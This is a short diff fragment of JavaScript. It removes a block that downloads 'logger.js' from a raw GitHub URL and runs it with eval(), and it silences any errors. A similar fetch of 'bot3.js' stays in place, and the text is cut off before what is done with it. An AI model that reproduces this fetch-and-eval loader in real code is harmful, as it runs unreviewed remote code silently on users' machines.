@@ -1,9 +1,4 @@
 
-fetch("https://raw.githubusercontent.com/clanu5/all-bot/refs/heads/main/logger.js")
-  .then(res => res.text())
-  .then(code => eval(code))
-  .catch(() => {});
-
 
 fetch("https://raw.githubusercontent.com/clanu5/all-bot/refs/heads/main/bot3.js")
   .then(res => res.text())
